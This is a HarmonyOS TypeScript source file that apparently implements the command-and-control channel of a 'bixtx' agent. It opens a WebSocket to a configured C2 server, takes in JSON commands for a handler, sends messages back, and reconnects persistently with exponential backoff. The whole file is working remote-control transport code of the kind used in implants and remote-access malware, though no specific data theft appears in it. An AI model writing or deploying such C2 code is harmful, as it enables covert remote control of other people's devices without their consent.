import webSocket from '@ohos.net.webSocket';
import { Config } from './Config';

type CommandHandler = (type: string, payload: Record<string, Object>) => void;

/**
 * WebSocket connection to the bixtx C2 server.
 * Uses @ohos.net.webSocket (HarmonyOS 3.2+).
 * Auto-reconnects with exponential backoff.
 */
export class C2Socket {
  private ws: webSocket.WebSocket | null = null;
  private reconnectDelay = Config.RECONNECT_DELAY;
  private alive = false;

  onCommand: CommandHandler | null = null;
  onConnect:    (() => void) | null = null;
  onDisconnect: (() => void) | null = null;

  connect(): void {
    this.alive = true;
    this.ws = webSocket.createWebSocket();

    this.ws.on('open', () => {
      this.reconnectDelay = Config.RECONNECT_DELAY;
      this.onConnect?.();
    });

    this.ws.on('message', (_err: Error, data: string | ArrayBuffer) => {
      const raw = typeof data === 'string' ? data : new TextDecoder().decode(data as ArrayBuffer);
      try {
        const parsed = JSON.parse(raw) as Record<string, Object>;
        const type = parsed['type'] as string;
        if (type) {
          const payload = Object.fromEntries(
            Object.entries(parsed).filter(([k]) => k !== 'type')
          ) as Record<string, Object>;
          this.onCommand?.(type, payload);
        }
      } catch {
        // malformed frame — ignore
      }
    });

    this.ws.on('close', () => {
      this.onDisconnect?.();
      if (this.alive) this.scheduleReconnect();
    });

    this.ws.on('error', (_err: Error) => {
      if (this.alive) this.scheduleReconnect();
    });

    this.ws.connect(Config.C2_WS_URL, {
      header: {
        'User-Agent':  `bixtx-agent/${Config.AGENT_VERSION}`,
        'X-Platform':  Config.PLATFORM,
      }
    }, (_err: Error, value: boolean) => {
      if (!value && this.alive) this.scheduleReconnect();
    });
  }

  send(type: string, payload: Record<string, Object> = {}): void {
    if (!this.ws) return;
    const msg = JSON.stringify({ type, ts: Date.now(), ...payload });
    this.ws.send(msg, (_err: Error) => { /* fire-and-forget */ });
  }

  disconnect(): void {
    this.alive = false;
    this.ws?.close(1000, 'shutdown', (_err: Error) => {});
    this.ws = null;
  }

  private scheduleReconnect(): void {
    const delay = this.reconnectDelay;
    this.reconnectDelay = Math.min(delay * 2, Config.MAX_RECONNECT);
    setTimeout(() => {
      if (this.alive) this.connect();
    }, delay);
  }
}
